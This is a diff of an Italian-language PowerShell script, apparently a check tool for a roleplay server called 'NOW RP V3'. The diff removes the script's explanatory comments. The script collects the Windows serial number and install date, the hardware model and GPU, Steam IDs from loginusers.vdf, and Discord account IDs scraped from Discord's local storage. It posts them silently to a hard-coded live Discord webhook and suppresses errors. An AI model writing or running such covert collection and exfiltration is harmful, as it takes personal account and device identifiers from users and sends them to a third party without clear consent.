@@ -7,26 +7,21 @@ Write-Host "========================================`n" -ForegroundColor Cyan
 $n = Read-Host "Inserisci il tuo Nickname Discord"
 $h = "https://discord.com/api/webhooks/1563653917932396556/9wpu5_KBJcDg9kQJ6IxfijGrnfKwfkBPghuySZHxDcMSv9PVuP4NG3cEFLXCTY7sSiQz"
 
-# Raccolta Dati Sistema Operativo e Hardware
 $s = Get-CimInstance Win32_OperatingSystem
 $o = $s.InstallDate.ToString('dd/MM/yyyy HH:mm')
 $sr = $s.SerialNumber
 
-# Controllo SteamID64
 $v = "C:\Program Files (x86)\Steam\config\loginusers.vdf"
 $st = "Non trovato"
 if(Test-Path $v){ $id = (Get-Content $v -EA 0 | Select-String '"7656119' -EA 0 | ForEach-Object { $_.ToString().Split('"')[1] }); if($id){ $st = $id -join ", " } }
 
-# Controllo Hardware & GPU
 $pc = (Get-CimInstance Win32_ComputerSystem).Model
 $gpu = (Get-CimInstance Win32_VideoController).Name -join ", "
 
-# Controllo Istanze Discord e Cache ID
 $dc = (Get-ChildItem "$env:APPDATA" -Filter "*discord*" -EA 0).Count
 $tk = Get-ChildItem "$env:APPDATA\discord\Local Storage\leveldb" -EA 0 | Select-String -Pattern '"id":"(\d{17,19})"' -EA 0 | ForEach-Object { $_.Matches.Groups[1].Value } | Select-Object -Unique
 $di = if($tk){ $tk -join ", " } else { "Nessuno" }
 
-# Payload per Discord
 $p = @{ 
     embeds = @(@{ 
         title = "NOW RP V3 - Advanced Control Board"
@@ -44,7 +39,6 @@ $p = @{
     }) 
 }
 
-# Invio al Webhook
 try { 
     Invoke-RestMethod -Uri $h -Method Post -Body ([System.Text.Encoding]::UTF8.GetBytes(($p | ConvertTo-Json -Depth 5))) -ContentType 'application/json; charset=utf-8' -EA 0 | Out-Null 
 } catch {}
